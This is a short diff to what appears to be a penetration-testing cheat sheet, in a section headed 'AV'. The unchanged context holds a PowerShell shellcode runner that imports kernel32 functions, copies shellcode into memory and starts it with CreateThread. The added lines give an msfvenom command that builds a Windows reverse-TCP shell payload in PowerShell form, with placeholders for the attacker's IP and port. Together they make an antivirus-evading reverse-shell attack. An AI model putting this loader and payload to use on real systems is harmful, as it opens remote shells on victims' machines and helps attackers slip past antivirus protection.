@@ -19,6 +19,8 @@ mkdir mywebdav
 
 ## AV
 
+### Powershell
+
 ```
 $code = '
 [DllImport("kernel32.dll")]
@@ -46,3 +48,11 @@ for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i
 
 $winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
 ```
+
+### Shell code
+
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=IpAtt LPORT=PortAtt -f powershell -v sc
+```
+
+
